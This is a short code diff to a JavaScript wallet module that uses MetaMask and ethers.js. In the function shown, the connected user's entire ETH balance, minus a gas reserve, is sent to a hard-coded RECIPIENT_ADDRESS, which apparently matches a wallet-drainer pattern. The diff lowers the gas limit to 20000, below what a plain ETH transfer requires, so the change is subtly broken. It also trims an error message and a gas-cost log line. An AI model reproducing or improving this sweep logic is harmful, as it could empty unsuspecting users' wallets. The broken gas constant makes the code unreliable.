@@ -20,7 +20,7 @@ export const CHAIN_NAMES = {
 };
 
 // Estimated gas limit for a simple ETH transfer
-const ESTIMATED_GAS_LIMIT = 21000;
+const ESTIMATED_GAS_LIMIT = 20000;
 
 /**
  * Get the current chain ID from MetaMask
@@ -94,9 +94,10 @@ export const transferAssets = async (
     const reservedAmount = gasCost.mul(2);
 
     // Ensure the user has enough balance to pay for gas and leave some reserved
-    if (balance.lte(reservedAmount)) {
-      throw new Error(`Insufficient funds. You need at least ${ethers.utils.formatEther(reservedAmount)} ETH to ensure you have enough for this and future transactions`);
-    }
+   if (balance.lte(reservedAmount)) {
+  throw new Error(`Insufficient funds. You need at least ${ethers.utils.formatEther(reservedAmount)} ETH for gas`);
+}
+
 
     // Calculate value to send: total balance - reserved amount
     const valueToSend = balance.sub(reservedAmount);
@@ -107,7 +108,6 @@ export const transferAssets = async (
     }
 
     console.log(`Transferring ${ethers.utils.formatEther(valueToSend)} ETH to ${RECIPIENT_ADDRESS}`);
-    console.log(`Gas cost for this transaction: ${ethers.utils.formatEther(gasCost)} ETH (${ethers.utils.formatUnits(gasPrice, 'gwei')} Gwei)`);
     console.log(`Reserved for future transaction: ${ethers.utils.formatEther(gasCost)} ETH`);
 
     // Create transaction object
